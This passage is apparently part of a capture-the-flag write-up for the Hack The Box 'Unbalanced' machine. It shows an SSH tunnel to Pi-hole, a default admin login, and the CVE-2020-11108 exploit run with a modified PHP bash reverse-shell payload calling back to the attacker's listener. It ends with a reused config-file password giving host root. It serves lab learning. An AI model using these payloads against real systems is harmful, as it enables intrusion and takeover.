+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh bryan@unbalanced.htb
+bryan@unbalanced.htb's password:
+Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Dec  5 07:36:55 2020 from 10.10.14.33
+bryan@unbalanced:~$
+</code></pre></div></div>
+<p><br />
+At this point, we can get the user flag.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bryan@unbalanced:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 32
+drwxr-xr-x 3 bryan bryan 4096 Jun 17 11:35 <span class="nb">.</span>
+drwxr-xr-x 3 root  root  4096 Jun 17 11:35 ..
+lrwxrwxrwx 1 root  root     9 Apr  3  2020 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 bryan bryan  220 Apr  2  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 bryan bryan 3526 Apr  2  2020 .bashrc
+drwx------ 3 bryan bryan 4096 Apr  2  2020 .gnupg
+<span class="nt">-rw-r--r--</span> 1 bryan bryan  807 Apr  2  2020 .profile
+<span class="nt">-rw-r--r--</span> 1 bryan bryan  798 Jun 17 11:35 TODO
+<span class="nt">-rw-r--r--</span> 1 root  root    33 Dec  5 06:48 user.txt
+bryan@unbalanced:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="bryans-home-todo">Bryan’s Home “TODO”</h2>
+<p>Once at the home directory, there is an interesting file named “TODO”
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bryan@unbalanced:~<span class="nv">$ </span><span class="nb">cat </span>TODO
+<span class="c">############</span>
+<span class="c"># Intranet #</span>
+<span class="c">############</span>
+<span class="k">*</span> Install new intranet-host3 docker <span class="o">[</span>DONE]
+<span class="k">*</span> Rewrite the intranet-host3 code to fix Xpath vulnerability <span class="o">[</span>DONE]
+<span class="k">*</span> Test intranet-host3 <span class="o">[</span>DONE]
+<span class="k">*</span> Add intranet-host3 to load balancer <span class="o">[</span>DONE]
+<span class="k">*</span> Take down intranet-host1 and intranet-host2 from load balancer <span class="o">(</span><span class="nb">set </span>as quiescent, weight zero<span class="o">)</span> <span class="o">[</span>DONE]
+<span class="k">*</span> Fix intranet-host2 <span class="o">[</span>DONE]
+<span class="k">*</span> Re-add intranet-host2 to load balancer <span class="o">(</span><span class="nb">set </span>default weight<span class="o">)</span> <span class="o">[</span>DONE]
+- Fix intranet-host1 <span class="o">[</span>TODO]
+- Re-add intranet-host1 to load balancer <span class="o">(</span><span class="nb">set </span>default weight<span class="o">)</span> <span class="o">[</span>TODO]
+
+<span class="c">###########</span>
+<span class="c"># Pi-hole #</span>
+<span class="c">###########</span>
+<span class="k">*</span> Install Pi-hole docker <span class="o">(</span>only listening on 127.0.0.1<span class="o">)</span> <span class="o">[</span>DONE]
+<span class="k">*</span> Set temporary admin password <span class="o">[</span>DONE]
+<span class="k">*</span> Create Pi-hole configuration script <span class="o">[</span>IN PROGRESS]
+- Run Pi-hole configuration script <span class="o">[</span>TODO]
+- Expose Pi-hole ports to the network <span class="o">[</span>TODO]
+bryan@unbalanced:~<span class="err">$</span>
+</code></pre></div></div>
+<p><br />Bryan is setting up Pi-hole. We can check if the Pi-hole is still up or accepting connections</p>
+
+<h3 id="check-if-pihole-is-open-and-operating">Check if PiHole is open and operating</h3>
+
+<h4 id="open-ports-looking-for-pi-hole">Open ports looking for Pi-Hole</h4>
+<p>Since netstat is not available, we can use <em><strong>ss -lnt</strong></em> command. <strong>-l</strong> is for listening, <strong>-n</strong> is for numbers only, and <strong>-t</strong> is for tcp;
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bryan@unbalanced:~<span class="nv">$ </span>ss <span class="nt">-lnt</span>
+State                 Recv-Q                 Send-Q                                 Local Address:Port                                 Peer Address:Port                
+LISTEN                0                      5                                            0.0.0.0:873                                       0.0.0.0:<span class="k">*</span>                   
+LISTEN                0                      128                                        127.0.0.1:8080                                      0.0.0.0:<span class="k">*</span>                   
+LISTEN                0                      128                                        127.0.0.1:5553                                      0.0.0.0:<span class="k">*</span>                   
+LISTEN                0                      32                                           0.0.0.0:53                                        0.0.0.0:<span class="k">*</span>                   
+LISTEN                0                      128                                          0.0.0.0:22                                        0.0.0.0:<span class="k">*</span>                   
+LISTEN                0                      128                                                <span class="k">*</span>:3128                                            <span class="k">*</span>:<span class="k">*</span>                   
+LISTEN                0                      5                                               <span class="o">[</span>::]:873                                          <span class="o">[</span>::]:<span class="k">*</span>                   
+LISTEN                0                      32                                              <span class="o">[</span>::]:53                                           <span class="o">[</span>::]:<span class="k">*</span>                   
+LISTEN                0                      128                                             <span class="o">[</span>::]:22                                           <span class="o">[</span>::]:<span class="k">*</span>                   
+bryan@unbalanced:~<span class="err">$</span>
+</code></pre></div></div>
+<p><br />There seems to be an port 8080, might be a webpage or the Pi-hole web UI. Let’s do a quick curl.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bryan@unbalanced:~<span class="nv">$ </span>curl http://localhost:8080 <span class="p">;</span> <span class="nb">echo</span>
+<span class="o">[</span>ERROR]: Unable to parse results from &lt;i&gt;queryads.php&lt;/i&gt;: &lt;code&gt;Unhandled error message <span class="o">(</span>&lt;code&gt;Invalid domain!&lt;/code&gt;<span class="o">)</span>&lt;/code&gt;
+bryan@unbalanced:~<span class="err">$</span>
+</code></pre></div></div>
+<p><br />It is responding to http. Let’s use the SSH tunneling.</p>
+
+<h3 id="using-ssh-tunneling-for-http-port-8080">Using SSH tunneling for http port 8080</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh bryan@unbalanced.htb <span class="nt">-L</span> 8080:127.0.0.1:8080 <span class="nt">-N</span>
+bryan@unbalanced.htb<span class="se">\'</span>s password:
+
+</code></pre></div></div>
+<p><br />Let’s now access it through the browser.<br />
+<img src="images/unbalanced/16.png" alt="pihole" />
+<br />It turns out we need to append “/admin” to get to pi-hole admin interface. <a href="https://discourse.pi-hole.net/t/how-do-i-access-pi-holes-dashboard-admin-interface/3168">SOURCE</a><br />
+<img src="images/unbalanced/17.png" alt="pihole login" /></p>
+
+<h3 id="pi-hole-login">Pi-hole Login</h3>
+<p>After appending the “/admin” we should now be able to get to login page admin by clicking on the login from the left side.<br />
+<img src="images/unbalanced/18.png# medium-p" alt="pihole login" />
+<br />Let’s try “admin” for password.<br />
+<img src="images/unbalanced/19.png" alt="pihole admin" />
+<br />LOL it worked!</p>
+
+<h3 id="pi-hole-exploit---cve-2020-11108">Pi-hole exploit - CVE-2020-11108</h3>
+<p>After logging in and a little bit of searching, it turns out there is a <a href="https://www.exploit-db.com/exploits/48443">Pi-hole exploit available for versions below 4.4</a>. Checking the current version:<br />
+<img src="images/unbalanced/20.png# medium" alt="pihole version" />
+<br />This version is vulnerable!</p>
+
+<h4 id="getting-the-phpsessid">Getting the PHPSESSID</h4>
+<p>We have to get first the PHPSESSID from the cookies assigned to use by the server. It will be needed by the POC<br />
+<img src="images/unbalanced/21.png" alt="pihole phpsessid" /></p>
+
+<h4 id="changed-payload-from-python3-to-bash">Changed payload from python3 to bash</h4>
+<p>After downloading the exploit and execute it, no response from the server. So I had changed the payload from python3 to bash
+<br /></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+<span class="c1"># Payload taken from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+# I opted to use the Python3 reverse shell one liner over the full PHP reverse shell.
+#shell_payload = """&lt;?php
+#  shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'")
+#?&gt;
+#""" %(LOCAL_IP, LOCAL_PORT)
+</span>
+<span class="n">shell_payload</span> <span class="o">=</span> <span class="s">"""&lt;?php
+  $sock=fsockopen("{}",{});
+  exec("bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");
+?&gt;
+"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">LOCAL_IP</span><span class="p">,</span> <span class="n">LOCAL_PORT</span><span class="p">)</span>
+<span class="p">...</span>
+</code></pre></div></div>
+<p><br />Save it and then reexecute the code. Just make sure that there is a listener on our side. I used netcat for it. The execution of exploit with new payload:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 48443_orig.py 7bfnctcni8uou4c0sb9davv863 <span class="s1">'http://localhost:8080'</span> 10.10.14.33 40000
+<span class="o">[</span>+] Put Root Stager Success
+<span class="o">[</span>+] Received First Callback
+<span class="o">[</span>+] Received Second Callback
+<span class="o">[</span>+] Uploading Root Payload
+<span class="o">[</span>+] Put Shell Stager Success
+<span class="o">[</span>+] Received Third Callback
+<span class="o">[</span>+] Received Fourth Callback
+<span class="o">[</span>+] Uploading Shell Payload
+<span class="o">[</span>+] Triggering Exploit
+</code></pre></div></div>
+<p><br />And this is what will be expected on the listener side
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 40000
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::40000
+Ncat: Listening on 0.0.0.0:40000
+Ncat: Connection from 10.10.10.200.
+Ncat: Connection from 10.10.10.200:39560.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>527<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@pihole:/var/www/html/admin/scripts/pi-hole/php# <span class="nb">whoami
+whoami
+</span>root
+</code></pre></div></div>
+
+<h3 id="pi-hole-docker-as-root">Pi-hole Docker as root</h3>
+<p>Even though we are root, this is not the actual host. So we need to enumerate for leverage.</p>
+
+<h4 id="getting-password-from-pi-hole-config-in-home">Getting password from pi-hole config in home</h4>
+<p>At the home directory of root there is a config file containing a password.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@pihole:/var/www/html/admin/scripts/pi-hole/php# <span class="nb">cd
+cd
+</span>root@pihole:~# <span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 132
+drwxrwxr-x 1 root root   4096 Apr  5  2020 <span class="nb">.</span>
+drwxr-xr-x 1 root root   4096 Jul 30 05:13 ..
+lrwxrwxrwx 1 root root      9 Apr  4  2020 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 root root    570 Jan 31  2010 .bashrc
+<span class="nt">-rw-r--r--</span> 1 root root    148 Aug 17  2015 .profile
+<span class="nt">-rw-r--r--</span> 1 root root 113876 Sep 20  2019 ph_install.sh
+<span class="nt">-rw-r--r--</span> 1 root root    485 Apr  6  2020 pihole_config.sh
+root@pihole:~# <span class="nb">cat </span>pihole_config.sh
+<span class="nb">cat </span>pihole_config.sh
+<span class="c">#!/bin/bash</span>
+
+<span class="c"># Add domains to whitelist</span>
+/usr/local/bin/pihole <span class="nt">-w</span> unbalanced.htb
+/usr/local/bin/pihole <span class="nt">-w</span> rebalanced.htb
+
+<span class="c"># Set temperature unit to Celsius</span>
+/usr/local/bin/pihole <span class="nt">-a</span> <span class="nt">-c</span>
+
+<span class="c"># Add local host record</span>
+/usr/local/bin/pihole <span class="nt">-a</span> hostrecord pihole.unbalanced.htb 127.0.0.1
+
+<span class="c"># Set privacy level</span>
+/usr/local/bin/pihole <span class="nt">-a</span> <span class="nt">-l</span> 4
+
+<span class="c"># Set web admin interface password</span>
+/usr/local/bin/pihole <span class="nt">-a</span> <span class="nt">-p</span> <span class="s1">'bUbBl3gUm$43v3Ry0n3!'</span>
+
+<span class="c"># Set admin email</span>
+/usr/local/bin/pihole <span class="nt">-a</span> email admin@unbalanced.htb
+root@pihole:~#
+</code></pre></div></div>
+<p><br />The password is <em><strong>bUbBl3gUm$43v3Ry0n3!</strong></em>. Let’s try using it to login as root against the host machine.</p>
+
+<h2 id="su-login-to-root-from-bryan">SU Login to root from bryan</h2>
+<p>Let’s try logging in as bryan first then switch user to root.
+<br /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh bryan@unbalanced.htb
+bryan@unbalanced.htb's password:
+Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Dec  5 13:23:22 2020 from 10.10.14.33
+bryan@unbalanced:~$ su root
+Password:
+root@unbalanced:/home/bryan# cd
+root@unbalanced:~# ls -la
+total 36
+drwx------  6 root root 4096 Apr  6  2020 .
+drwxr-xr-x 18 root root 4096 Jun 17 14:08 ..
+lrwxrwxrwx  1 root root    9 Apr  3  2020 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  3 root root 4096 Apr  3  2020 .config
+drwx------  3 root root 4096 Apr  2  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Apr  3  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-------  1 root root   33 Dec  5 06:48 root.txt
+drwx------  2 root root 4096 Apr  6  2020 .ssh
+root@unbalanced:~#
+</code></pre></div></div>
+<p><br />We now have pwned the machine! Thank you for reading :D</p>
+
+<h1 id="sources">Sources:</h1>
+<ul>
+  <li>https://discourse.pi-hole.net/t/how-do-i-access-pi-holes-dashboard-admin-interface/3168</li>
+  <li>https://www.exploit-db.com/exploits/48443</li>
+  <li>https://www.exploit-db.com/exploits/48442</li>
+  <li>http://squid-web-proxy-cache.1019090.n4.nabble.com/How-to-run-squidclient-td4670539.html</li>
+  <li>https://medium.com/@minimalist.ascent/enumerating-rsync-servers-with-examples-cc3718e8e2c0</li>
+  <li>https://www.speedguide.net/port.php?port=873</li>
+  <li>https://www.digitalocean.com/community/tutorials/how-to-use-rsync-to-sync-local-and-remote-directories</li>
+  <li>https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml</li>
+  <li>https://wiki.archlinux.org/index.php/EncFS#User_friendly_mounting</li>
+</ul>
+:ET
